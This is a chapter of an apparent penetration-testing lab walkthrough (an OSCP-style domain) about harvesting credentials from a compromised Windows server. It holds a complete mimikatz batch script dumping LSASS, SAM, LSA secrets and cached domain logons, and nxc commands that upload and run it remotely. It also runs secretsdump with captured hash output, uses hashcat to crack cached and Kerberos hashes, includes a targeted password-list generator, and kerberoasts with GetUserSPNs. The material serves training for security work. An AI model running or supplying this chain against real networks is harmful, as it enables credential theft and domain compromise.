# 04 — Credentials: LSASS, the NL$ cache, and `web_svc`

SYSTEM on MS01 does not hand over the domain. It hands over the material to *ask* for it.
This chapter turns that material into one working domain credential.

## 4.1 Two sources, not one

On a member server there are two distinct stores:

| Store | Contains | Reachable how |
|---|---|---|
| LSASS (memory) | interactive and service logon sessions | `sekurlsa::logonpasswords` as SYSTEM |
| `SECURITY` hive (disk) | the NL$ cache — **domain** logons | `lsadump::cache` / `secretsdump` |

The second is the one that matters on a member server. LSASS only holds sessions that exist
right now; the NL$ cache holds up to `CachedLogonsCount` (10 here) domain accounts that have
ever logged on, with a PBKDF2 verifier that can be attacked offline.

## 4.2 mimikatz in one invocation

Interactive mimikatz sessions produce scattered, half-remembered output. Run the whole set
once, with logging, from a SYSTEM context:

```bat
@echo off
REM mimi.cmd - non-interactive mimikatz run
REM token::elevate gives SYSTEM from an Administrator token; no-op if already SYSTEM.
setlocal
cd /d C:\Windows\Temp || exit /b 1
if not exist mimikatz.exe ( echo [x] mimikatz.exe missing & exit /b 1 )

del /q mimi.log 2>nul
del /q mimi_*.kirbi 2>nul

mimikatz.exe "log C:\Windows\Temp\mimi.log" ^
  "privilege::debug" ^
  "token::elevate" ^
  "sekurlsa::logonpasswords" ^
  "sekurlsa::ekeys" ^
  "sekurlsa::tickets /export" ^
  "lsadump::sam" ^
  "lsadump::secrets" ^
  "lsadump::cache" ^
  "exit"

if exist mimi.log for %%A in (mimi.log) do echo [i] log: %%~zA bytes
endlocal
```

Run it and pull the log back:

```bash
nxc smb   192.168.133.153 -u Administrator -p December31 --local-auth \
  --put-file /usr/share/windows-resources/mimikatz/x64/mimikatz.exe '\Windows\Temp\mimikatz.exe'
nxc smb   192.168.133.153 -u Administrator -p December31 --local-auth \
  --put-file ./mimi.cmd '\Windows\Temp\mimi.cmd'

nxc winrm 192.168.133.153 -u Administrator -p December31 --local-auth \
  -x 'cmd /c C:\Windows\Temp\mimi.cmd'

nxc smb   192.168.133.153 -u Administrator -p December31 --local-auth \
  --get-file '\Windows\Temp\mimi.log' ./mimi.log
```

Note the `--put-file` / `--get-file` path form: **share-relative, no drive letter**. nxc sends
the path verbatim to the share named by `--share` (default `C$`), so `'C:\Windows\Temp\x'`
produces `STATUS_OBJECT_NAME_INVALID` (`0xc0000033`). This costs an hour if you do not know it.

## 4.3 The equivalent, without mimikatz

`secretsdump` does the same job over the network and produces cleaner output for parsing:

```bash
impacket-secretsdump 'Administrator:December31@192.168.133.153' -outputfile ms01_20261124
```

**Captured** — what it returns:

```
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3c4495bbd678fac8c9d218be4f2bbc7b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:11ba4cb6993d434d8dbba9ba45fd9011:::
Mary.Williams:1002:aad3b435b51404eeaad3b435b51404ee:9a3121977ee93af56ebd0ef4f527a35e:::
support:1003:aad3b435b51404eeaad3b435b51404ee:d9358122015c5b159574a88b3c0d2071:::
cloudbase-init:1004:aad3b435b51404eeaad3b435b51404ee:d16c0447bc46e6ac70b16db6bb2acc70:::
Admin:1005:aad3b435b51404eeaad3b435b51404ee:087a20218079b99cd5d3b8a67747943c:::

[*] Dumping cached domain logon information (domain/username:hash)
OSCP.EXAM/eric.wallows:$DCC2$10240#eric.wallows#28c1cc0c4fa49db338857157d3aded70: (2025-02-03 21:14:27)
OSCP.EXAM/Administrator:$DCC2$10240#Administrator#a3a38f45ff2adaf28e945577e9e2b57a: (2022-11-10 10:06:42)
OSCP.EXAM/web_svc:$DCC2$10240#web_svc#130379745455ae62bbf41faa0572f6d3: (2022-11-14 08:58:38)
```

Read that output carefully — it contains the whole engagement:

- **`web_svc` has a cached domain logon.** A local account cannot appear here. This proves
  `web_svc` is a **domain** identity, which is what makes it worth cracking.
- `Administrator` also has one, dated 2022 — a domain admin cache, and a tempting decoy.
- `eric.wallows` has one, and **we already know his password**. That is a free control sample.

## 4.4 Triage before cracking

A dump mixes local accounts, machine accounts and rotated secrets. Sort it first, so cracking
time is spent only on material that is actually new:

```python
#!/usr/bin/env python3
"""secrets2hashes.py — secretsdump/mimikatz text -> hashcat files + triage.

Writes nt.txt (-m 1000), nt_users.txt, dcc2.txt (-m 2100), machine.txt,
lsa_secrets.txt and summary.md. With --known, each account is marked
same / rotated / new / empty by prefix-comparing against a baseline.
"""
import argparse, re, sys
from pathlib import Path

SAM_RX = re.compile(r"^([^\s:]{1,64}):(\d{3,4}):([0-9a-fA-F]{32}):([0-9a-fA-F]{32}):{3}$", re.M)
DCC2_RX = re.compile(r"^\S*?(\$DCC2\$\d+#[^#\s]+#[0-9a-fA-F]{32})", re.M)

EMPTY_NT = "31d6cfe0d16ae931b73c59d7e0c089c0"        # NT hash of an empty password
JUNK = {"guest", "defaultaccount", "wdagutilityaccount"}


def cmp_known(user, h, known):
    if h.lower() == EMPTY_NT or user.lower() in JUNK:
        return "empty"
    base = known.get(user.lower())
    if base is None:
        return "new"
    if base.startswith(h.lower()) or h.lower().startswith(base):
        return "same"
    return "rotated"                                 # account exists, hash changed


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("input"); ap.add_argument("-o", "--outdir", default=".")
    ap.add_argument("--known")
    a = ap.parse_args()

    text = Path(a.input).read_text(errors="replace")
    sam = [{"user": u, "rid": int(r), "nt": n} for u, r, _l, n in SAM_RX.findall(text)]
    dcc2 = DCC2_RX.findall(text)

    known = {}
    if a.known:
        for line in Path(a.known).read_text().splitlines():
            if ":" in line and not line.startswith("#"):
                u, _, h = line.partition(":")
                known[u.strip().lower()] = h.strip().lower()

    out = Path(a.outdir); out.mkdir(parents=True, exist_ok=True)
    (out / "nt_users.txt").write_text("".join(f"{r['user']}:{r['nt']}\n" for r in sam))
    (out / "nt.txt").write_text("".join(f"{r['nt']}\n" for r in sam))
    (out / "dcc2.txt").write_text("".join(f"{h}\n" for h in dcc2))

    rows = [f"| {r['user']} | {r['rid']} | {cmp_known(r['user'], r['nt'], known)} |"
            for r in sorted(sam, key=lambda x: x["rid"])]
    (out / "summary.md").write_text(
        "| Account | RID | vs baseline |\n|---|---|---|\n" + "\n".join(rows) + "\n")
    print(f"[+] {len(sam)} SAM, {len(dcc2)} DCC2 -> {out}/")


if __name__ == "__main__":
    main()
```

```bash
python3 secrets2hashes.py ms01_20261124.ntds -o loot/ --known known_baseline.txt
```

**Captured** triage result:

| Account | Status vs baseline | Action |
|---|---|---|
| `Administrator` | same | already known — `December31`; skip |
| `support` | same | already known — `Freedom1`; skip |
| `Mary.Williams` | same | unchanged, uncracked; not worth time |
| `cloudbase-init` | **rotated** | new material, but a service secret |
| `Admin` (1005) | **rotated** | new material |
| `Guest` | empty | skip |

Without this step, three of six accounts get cracked twice.

## 4.5 Validate the tooling before trusting it

Before attacking a target hash, prove the pipeline on a hash whose answer is known. `eric.wallows`
is perfect: we hold his password.

```bash
printf '%s\n' '$DCC2$10240#eric.wallows#28c1cc0c4fa49db338857157d3aded70' > eric.txt
printf '%s\n' 'EricLikesRunning800' > cand.txt
hashcat -m 2100 eric.txt cand.txt --potfile-path ./pot --force --quiet
hashcat -m 2100 eric.txt --potfile-path ./pot --show
```

**Captured**:

```
$DCC2$10240#eric.wallows#28c1cc0c4fa49db338857157d3aded70:EricLikesRunning800
```

That does two things at once: it confirms the cracking setup, and it confirms the cache entries
are **current** rather than left over from an old build.

> A hand-rolled PBKDF2 implementation was tried first and produced no match across 315 salt /
> encoding / iteration combinations. That was not the cache being wrong — it was the script
> being wrong about the MS-CACHE v2 salt convention. **Use hashcat for `-m 2100`.** A custom
> implementation that is subtly wrong returns plausible-looking garbage, which is worse than
> an error.

## 4.6 Crack the cache

`-m 2100` is PBKDF2-HMAC-SHA1/10240 and is CPU-bound: roughly **15–18 kH/s** on 4 vCPU, so the
full rockyou (14.3M) takes about 16 minutes for both target hashes together. A GPU is ~1000×
faster here.

```bash
# the real targets: web_svc (domain service account) and the Administrator cache (decoy)
printf '%s\n' \
  '$DCC2$10240#web_svc#130379745455ae62bbf41faa0572f6d3' \
  '$DCC2$10240#Administrator#a3a38f45ff2adaf28e945577e9e2b57a' > both.txt

hashcat -m 2100 -a 0 both.txt /usr/share/wordlists/rockyou.txt \
  --potfile-path ./pot --force --status --status-timer 60

hashcat -m 2100 both.txt --potfile-path ./pot --show
```

**Captured**:

```
$DCC2$10240#web_svc#130379745455ae62bbf41faa0572f6d3:Diamond1
```

`web_svc : Diamond1` — recovered from rockyou, i.e. it was a dictionary password, which is the
finding. The domain `Administrator` cache did **not** crack: rockyou, an 83k targeted list
(dates, seasons, org terms — see the generator below) and a `best66` rule pass all failed. It is
dated 2022-11-10 and is a decoy; do not block on it.

The targeted list, for hashes that resist a plain dictionary:

```python
#!/usr/bin/env python3
"""gen_targeted.py — lab-shaped candidates: Word+Number patterns and dated secrets.

The image's known passwords are December31, Freedom1, EricLikesRunning800 — all
Word+Number. So the productive space is month/day, season, quarter, year and
on-box vocabulary, crossed with separators, years and suffixes.
"""
import calendar, itertools, sys

MONTHS = ["January","February","March","April","May","June","July",
          "August","September","October","November","December"]
SEASONS = ["Spring","Summer","Fall","Autumn","Winter"]
SUFFIXES = ["", "!", "!!", "@", "#", "1", "12", "123", "1234", "01", "2022", "2022!", "22"]
YEARS = [str(y) for y in range(1995, 2027)]

out = set()

def emit(base, years=True):
    for s in SUFFIXES:
        out.add(f"{base}{s}")
    if years:
        for y in YEARS:
            for s in ("", "!", "@", "#"):
                out.add(f"{base}{y}{s}")

for m in MONTHS:
    for d in range(1, 32):
        for sep in ("", "-", "_", "."):
            emit(f"{m}{sep}{d}", years=False)
            emit(f"{m}{sep}{d:02d}", years=False)
            emit(f"{d:02d}{sep}{m}", years=False)
    emit(m); emit(m.lower())

for w in SEASONS + ["Q1","Q2","Q3","Q4"]:
    emit(w); emit(w.lower(), years=False)

for y in YEARS:
    for s in ("", "!", "@", "#", "!!"):
        out.add(f"{y}{s}")

for v in ("Administrator","Admin","Password","Passw0rd","P@ssw0rd","Welcome","Changeme",
          "Letmein","Qwerty","Secret","Support","Freedom","Service","Backup","Domain",
          "Company","Holiday","Soccer","Michael","Jessica","Celia","Almeda","Eric","Wallows",
          "OSCP","Oscp","oscp","Offsec","OffSec","ProvingGrounds","Kali","Linux"):
    emit(v); out.add(v.capitalize())

sys.stdout.write("\n".join(sorted(out)) + "\n")
print(f"# {len(out)} candidates", file=sys.stderr)
```

```bash
python3 gen_targeted.py --with-org oscp.exam,offsec,provinggrounds > targeted.txt
hashcat -m 2100 -a 0 both.txt targeted.txt --potfile-path ./pot --force
```

## 4.7 Confirm the credential is real, twice

A cracked password is a claim until it authenticates. And a password recovered from one hash
type should be reproducible from another — which is exactly what a kerberoast gives you.

```bash
# 1. does it work against the domain?
nxc smb 10.10.133.152 -u web_svc -p Diamond1 -d oscp.exam
nxc smb 192.168.133.153 -u web_svc -p Diamond1 -d oscp.exam

# 2. independent confirmation: the same account's kerberoastable SPN
impacket-GetUserSPNs oscp.exam/web_svc:Diamond1 -dc-ip 10.10.133.152 \
  -request -outputfile web_svc_tgs.txt
# -> $krb5tgs$23$*web_svc$OSCP.EXAM$oscp.exam/web_svc*$...
```

**Captured** — the TGS cracked to `Diamond1` as well. Two different hash types, `-m 2100` and
`-m 13100`, agreeing on the same plaintext. That is as close to proof as a password gets:

```
$krb5tgs$23$*web_svc$OSCP.EXAM$oscp.exam/web_svc*$2b9e6d78...:Diamond1
```

## 4.8 What `web_svc` is, and what it is not

| Property | Value |
|---|---|
| Type | **domain** service account (cached logon + SPN `HTTP/MS01.oscp.exam`) |
| Groups | **none** beyond `Domain Users` |
| WinRM on MS02 | ✗ tested, `[-]` |
| MSSQL on MS02 (49700) | connects, but as **`guest`**, `sysadmin = 0` |

This is the honest boundary of the credential: it is a real domain identity that opens **LDAP**
and a kerberoastable SPN, and nothing else directly. The temptation is to read `web_svc` as
"domain access achieved" — it is not. It is a seat at the table, not a key to the room. What it
buys is chapter 06: the ability to query the directory and roast the account that *does* have
database rights.

## 4.9 The credential that was needed all along

`web_svc` was obtained by cracking the NL$ cache — which required SYSTEM on MS01 — which
required `December31`. That whole chain is a **shortcut**, not a requirement: `web_svc` has an
SPN, so it can be kerberoasted directly by any authenticated domain user, including `eric.wallows`.
Chapter 06 shows that. It is worth knowing that the intended path never touches MS01's SAM.
